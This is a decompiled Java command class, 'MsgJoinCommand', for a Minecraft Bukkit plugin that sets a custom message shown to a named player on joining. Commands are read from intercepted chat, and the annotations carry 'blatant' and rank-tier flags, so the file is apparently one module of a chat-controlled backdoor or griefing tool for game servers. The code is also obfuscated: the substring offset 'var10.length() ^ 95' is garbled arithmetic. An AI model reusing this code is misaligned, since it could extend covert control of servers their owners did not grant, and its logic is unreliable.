package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.HashMap;
import org.bukkit.ChatColor;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "msgjoin",
   description = "Sends the specified message to the player when they join",
   blatant = false,
   rank = Rank.LITE,
   aliases = {"messagejoin"}
)
public class MsgJoinCommand extends AbstractCommand {
   public static HashMap<String, String> joinMessages = new HashMap<>();

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length < 2) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use msgjoin <player> <msg>");
      } else {
         StringBuilder var4 = new StringBuilder();

         for(String var8 : var3) {
            var4.append(" ").append(ChatColor.translateAlternateColorCodes('&', var8));
         }

         String var10 = var3[0];
         var4 = new StringBuilder(var4.substring(var10.length() ^ 95));
         joinMessages.remove(var10);
         joinMessages.put(var10, String.valueOf(var4));
         ChatUtil.sendChat(var1.getPlayer(), "The join message for the player " + var10 + " has been set to " + var4 + ".");
      }
   }
}
